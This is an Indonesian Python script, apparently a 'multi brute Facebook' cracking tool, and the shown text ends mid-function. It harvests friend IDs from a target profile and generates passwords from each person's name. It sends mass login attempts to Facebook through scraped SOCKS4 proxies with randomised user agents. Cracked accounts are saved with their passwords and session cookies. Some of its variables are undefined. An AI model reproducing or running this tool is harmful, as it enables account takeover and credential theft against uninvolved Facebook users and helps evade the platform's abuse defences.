#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
#------------------[  MODULE  ]-------------------#
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ GLOBAL NAME ]-------------------#
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
uidl =[]
opsi=[]
uidf=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2; BMBF | BrayennnXD Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD');exit()
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

#------------[ UBAH UA DIH SINI OM ]---------------#
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    g1 = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19'])
    g2 = random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1'])
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; M2012K11AG Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Infinix X5514D Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Meizu C10 Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    UaMainn = random.choice([u1, u2, u3, u4, u5])
    ugen.append(UaMainn)
 
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
try:cek_data = requests.get("http://ip-api.com/json/").json()
except:cek_data = {'-'}
try:asal_kota = cek_data["city"]
except:asal_kota = {'-'}
try:asal_reg = cek_data["region"]
except:asal_reg = cek_data['-']
try:times = cek_data["timezone"]
except:times = cek_data['-']
try:city = cek_data["city"]
except:city = cek_data['-']
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""[bold green]                ___  ____ ____ _   _ ____ _  _ _  _ _  _ 
[bold green]                |__] |__/ |__|  \_/  |___ |\ | |\ | |\ | 
[bold green]                |__] |  \ |  |   |   |___ | \| | \| | \|                                                                                                        
             """,width=90,padding=(0,8),title=f"Banner",style=f"bold white"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tCookies Capture Extension Suggestion : [green]Cookiedough[white]'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'Enter Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} Login Succes !{x} ');time.sleep(1)
		os.system('python h7.py')
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR ACCOUNT !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]------
def menu(name,id):
	try:
		cok = open('.cok.txt','r').read()
	except IOError:
		os.system('rm -rf .token.txt && rm -rf .cok.txt')
		baz_anim(f'└──{mer} cookies telah kadaluarsa ster')
		waktu(1)
		login_men()
	os.system('clear')
	os.system('xdg-open https://chat.whatsapp.com/Bk9n3OYSK0h8yc4oHgHkZN')
	waktu(1)
	banner()
	print(f'{xxx}─────────────────────────────')
	print(f'{xxx} {P}Selamat Datang{N} {H}{name}{N} {P}Di Sc SCBF{N}') 
	print(f'{xxx}─────────────────────────────')
	print(f'{xxx}└── crack publik/file/logout')
	helpbas = input(f'{xxx}└── : ')
	if helpbas in ['publik','Publik','public']:
		nge_krek()
	elif helpbas in ['file','File','files']:
		file_dump()
	elif helpbas in ['logout']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		print('└─ Sukses Logout+Hapus Kukis ')
		exit()
	else:
		baz_anim(f'{puti}└──{mer} masukkan dengan benar')
		baz_anim(f'{puti}└──{mer} input publik/file/logout')

###----------[ DUMP ID PUBLIK ]----------###
def nge_krek():
	try:
		cok = open('.cok.txt','r').read()
	except IOError:
		os.system('rm -rf .token.txt && rm -rf .cok.txt')
		baz_anim(f'└──{mer} cookies telah kadaluarsa ster')
		exit()
	print(f'{xxx}─────────────────────────────')
	idnyanih = input(f'└── id : ')
	try:
		ambilid = requests.get('https://graph.facebook.com/v1.0/'+idnyanih+'?fields=friends.limit(5001)&access_token='+tokenefb[0],cookies={'cookie': cok}).json()
		for proses in ambilid['friends']['data']:
			try:id.append(proses['id']+'|'+proses['name'])
			except:continue
		print(f'└── terkumpul : '+str(len(id)))
		atur_dulu()
	except requests.exceptions.ConnectionError:
		baz_anim(f'{puti}└──{mer} koneksi terputus')
		exit()
	except (KeyError,IOError):
		baz_anim(f'{puti}└──{mer} teman tidak publik')
		baz_anim(f'{puti}└──{mer} ganti id target nya')
		waktu(1)
		nge_krek()

###----------[ CRACK  FILE ]----------###
def file_dump():
	mz = 0
	bzz = {}
	print(f'{xxx}─────────────────────────────')
	try:baz_gtg = os.listdir('/sdcard/DUMP-FILE/')
	except FileNotFoundError:
		print('└── file dump tidak ada ster ')
		print('└── buat file terlebih dahulu ')
		waktu(2)
		exit()
	if len(baz_gtg)==0:
		print('└── file dump tidak ada ster ')
		print('└── buat file terlebih dahulu ')
		waktu(2)
		exit()
	else:
		for file_id in baz_gtg:
			try:pen_file = open('/sdcard/DUMP-FILE/'+file_id,'r').readlines()
			except:continue
			mz+=1
			if mz<100:
				jumh = ''+str(mz)
				bzz.update({str(mz):str(file_id)})
				bzz.update({jumh:str(file_id)})
				print(f'└── %s. %s ({hijo} %s{xxx} )'%(jumh,file_id,len(pen_file)))
			else:
				bzz.update({str(mz):str(file_id)})
				print('['+str(mz)+'] '+file_id+' [ '+str(len(pen_file))+' akun ]'+x)
				print('└── %s. %s ({hijo} %s {xxx}) '%(mz,file_id,len(pen_file)))
		_chos_baz = input('└── : ')
		try:gaz_sung = bzz[_chos_baz]
		except KeyError:
			print(f'└── yang bener milihnya {xxx}')
			waktu(2)
			file_dump()
		try:cekz_ = open('/sdcard/DUMP-FILE/'+gaz_sung,'r').read().splitlines()
		except:
			print('└── filenya tidak ada ')
			waktu(2)
			exit()
		for idnyh in cekz_:
			id.append(idnyh)
		atur_duluh()
		
def atur_duluh():
	print(f'{xxx}─────────────────────────────')
	print('└── 1. akun baru')
	print('└── 2. akun acak')
	aturidh = input(f'{xxx}└── : ')
	if aturidh in ['1','01']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturidh in ['2','02']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		baz_anim(f'{puti}└── {mer}pilih yang bener')
		waktu(1)
		atur_duluh()
		exit()
		
	print(f'{xxx}─────────────────────────────')
	print('└── enter untuk mulai crack')
	print(f'{xxx}─────────────────────────────')
	metodh = input(f'')
	if metodh in ['',' ']:
		xbz.append('metodh1')
	else:
		xbz.append('metodh1')
	passwrdh()

def passwrdh():
	global prog,des
	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for aldous in id2:
				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if '><v><' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'metodh1' in xbz:
					gas_krek.submit(metodh1,idf,pwv)
				else:
					gas_krek.submit(metodh1,idf,pwv)
		yhg = '0'
		print(f'{xxx}─────────────────────────────')
		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}akun cp : {kun}{yhg}{xxx} ')
		print(f'{xxx}─────────────────────────────')

def metodh1(idf,pwv):
	yhn = '0'
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{yhn}')
	prog.advance(des)
	ua = random.choice(usrgent2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
				#open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└── {hijo}{ua}{xxx}')
				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ ATUR SBLUM KREK ]----------###
def atur_dulu():
	print(f'{xxx}─────────────────────────────')
	print('└── 1. akun baru')
	print('└── 2. akun acak')
	print('└── 3. akun lama')
	aturid = input(f'{xxx}└── : ')
	if aturid in ['1','01']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['2','02']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	elif aturid in ['3','03']:
		for akunlama in sorted(id):
			id2.append(akunlama)
	else:
		baz_anim(f'{puti}└──{mer} pilih yang bener{xxx}')
		waktu(1)
		atur_dulu()
		exit()
		
	print(f'{xxx}─────────────────────────────')
	print('└── 1. m.fb')
	print('└── 2. free.fb')
	print('└── 3. mbasic.fb')
	metod = input(f'{xxx}└── : ')
	if metod in ['1','01']:
		baz.append('metod1')
	elif metod in ['2','02']:
		baz.append('metod2')
	elif metod in ['3','03']:
		baz.append('metod3')
	else:
		baz.append('metod1')
		
	print(f'{xxx}─────────────────────────────')
	print('└── tambahkan ua y atau t')
	uatambah = input(f'└── : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		print(f'{xxx}─────────────────────────────')
		bzer = input(f'└── ua : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	print(f'{xxx}─────────────────────────────')
	print('└── tambahkan pw manual y atau t')
	pwtambah = input(f'└── : ')
	if pwtambah in ['y','Ya','ya','Y']:
		pwpluss.append('ya')
		print(f'{xxx}─────────────────────────────')
		babi = input(f'└── pw : ')
		babih = babi.split(',')
		for xpw in babih:
			pwnya.append(xpw)
	else:
		pwpluss.append('tidak')
	passwrd()

###----------[ BAGIAN PASSWORD ]----------###
def passwrd():
	global prog,des
	print(f'{xxx}─────────────────────────────')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for aldous in id2:
				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if '><v><' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'metod1' in baz:
					gas_krek.submit(metod1,idf,pwv)
				elif 'metod2' in baz:
					gas_krek.submit(metod2,idf,pwv)
				elif 'metod3' in baz:
					gas_krek.submit(metod3,idf,pwv)
				else:
					gas_krek.submit(metod1,idf,pwv)
		print(f'{xxx}─────────────────────────────')
		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}akun cp : {kun}%s{xxx} '%(cp))
		print(f'{xxx}─────────────────────────────')
		
###----------[ MOBILE.FB ]----------###
def metod1(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [bold green]OK[/]:[bold green]{(ok)} [/]=[bold yellow] CP[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(prem)
	ua2 = random.choice(free)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=756394828561216&kid_directed_site=0&app_id=756394828561216&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fapp_id%3D756394828561216%26cbt%3D1693983878107%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1cbbf8d625deec%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2df3749b48551c%2526relation%253Dopener%26client_id%3D756394828561216%26display%3Dtouch%26domain%3Dayo.coca-cola.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df2bcbd4f77280dc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1912d047c5da34%2526domain%253Dayo.coca-cola.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fayo.coca-cola.co.id%25252Ff2df3749b48551c%2526relation%253Dopener%2526frame%253Df149687d2df0e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1912d047c5da34%26domain%3Dayo.coca-cola.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fayo.coca-cola.co.id%252Ff2df3749b48551c%26relation%3Dopener%26frame%3Df149687d2df0e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
